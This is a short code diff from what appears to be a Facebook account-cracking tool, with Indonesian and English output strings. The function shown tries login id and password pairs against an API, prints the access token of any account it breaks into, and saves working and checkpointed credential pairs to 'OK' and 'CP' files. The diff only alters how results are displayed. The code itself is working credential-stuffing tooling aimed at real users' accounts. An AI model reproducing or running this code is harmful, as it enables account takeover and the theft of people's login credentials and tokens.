@@ -1048,21 +1048,12 @@ def methodnew(idf,pwv):
 			j = json.loads(r)
 			error = j['error_msg']
 			if 'access_token' in j:
-				ok+=1
-				tree = Tree(f"  ")
-				tree.add(f"[bold green]{idf}|{pw}")
-				tree.add(f"[bold green]{ua}\n")
-				cetak(tree) 
+				print ("\033[34m[*] Access Token Kamu ( Your Access Token )\n\033[32m[\033[35m>\033[32m] \033[36m"+j['access_token'])
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
 			elif 'www.facebook.com' in j["error_msg"]:
-				tree = Tree(f" ")
-				tree.add(f"[bold yellow]{idf}|{pw}")
-				tree.add(f"[bold yellow]{ua}\n")
-				cetak(tree)
+				print ("\033[33m[*] Akun Kena Sesi ( Account Checkpoint )")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
 				break
 			else:
 				continue
